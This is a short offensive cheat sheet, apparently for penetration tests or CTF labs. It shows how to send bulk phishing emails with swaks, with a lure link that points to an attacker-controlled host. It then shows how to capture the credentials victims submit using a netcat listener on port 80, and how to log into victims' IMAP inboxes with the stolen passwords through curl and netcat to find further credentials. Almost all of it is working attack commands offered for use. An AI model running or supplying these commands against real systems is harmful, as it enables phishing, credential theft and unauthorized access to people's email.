# SWAKS SMTP Phishing + IMAP Credential Capture

Send bulk phishing emails via SMTP using swaks. A user clicking the link sends back credentials (Basic Auth, form POST, NTLM) to your listener.

## Send Phishing Email to Multiple Recipients
```bash
swaks --to $(cat emails.txt | tr '\n' ',') \
  --from "noreply@<domain>" \
  --header "Subject: Action Required" \
  --body "Please log in: http://<LHOST>/" \
  --server <SMTP_IP>
```

## Capture Incoming Credentials
Start a netcat listener before sending:
```bash
nc -lvnp 80
```
When a user clicks and their client auto-authenticates (e.g., Outlook following redirects), you may capture Basic Auth or form POST with credentials.

## Read IMAP Inbox After Getting Creds
```bash
# Via curl
curl -u '<user>:<pass>' imaps://<TARGET>/INBOX --insecure

# Via evolution or Thunderbird GUI
# Or via netcat: connect port 143, LOGIN user pass, SELECT INBOX, FETCH 1:* RFC822
nc <TARGET> 143
A1 LOGIN <user> <pass>
A2 SELECT INBOX
A3 FETCH 1:* RFC822.HEADER
```

## Notes
- Works when SMTP allows unauthenticated relay or you have valid SMTP creds
- IMAP useful for finding further creds (FTP passwords, internal notes)
- Combine with vhost enumeration to find mail subdomain
